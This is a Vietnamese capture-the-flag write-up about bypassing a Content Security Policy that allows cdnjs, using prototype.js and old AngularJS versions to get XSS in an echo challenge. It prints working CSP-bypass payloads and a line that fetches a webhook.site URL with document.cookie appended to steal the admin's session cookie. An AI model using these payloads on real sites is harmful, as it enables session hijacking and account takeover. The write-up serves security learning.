
---
Tài liệu/Bài báo tham khảo:
https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/

---
![[Pasted image 20261012221259.png]]

Challenge khá thú vị khi cho chúng ta một chức năng để Echo tất cả những gì ta nhập ra Client-side.

Không biết do mình gà hay CLB troll nhưng mà mình thấy bài này không easy với mình cho lắm 😭

![[Pasted image 20261012221429.png]]

Có thể thấy, website đang sử dụng CSP:

```CSP
default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: *;
```

![[Pasted image 20261012222613.png]]

Ngoài chính trang web thì `<script>` còn cho phép nguồn từ cdnjs. Như trang web bên trên phân tích thì CSP thường bị Bypass từ source này.

![[Pasted image 20261012224810.png]]

Mình lên mạng tìm một lúc thì thấy một bài báo nói về điều này, copy payload của họ vào thì gặp XSS thật kaka.
Payload:
```html
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
    <div ng-app ng-csp>
      {{$on.curry.call().alert('xss')}}
    </div>
```
Bạn có thể đọc thêm tại: https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/ để hiểu cách nó hoạt động nhé.

![[Pasted image 20261012225006.png]]

Giờ mình chỉ việc sửa payload một chút để ăn cắp cookie của Admin là xong:

```html
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().$eval('alert(1)')}}
</div>
```

fetch('https://webhook.site/5ff8415e-1c7c-46eb-9d75-c69ef358de6b' %2B document.cookie)
```
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script> <div ng-app ng-csp>{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }} </div>
```
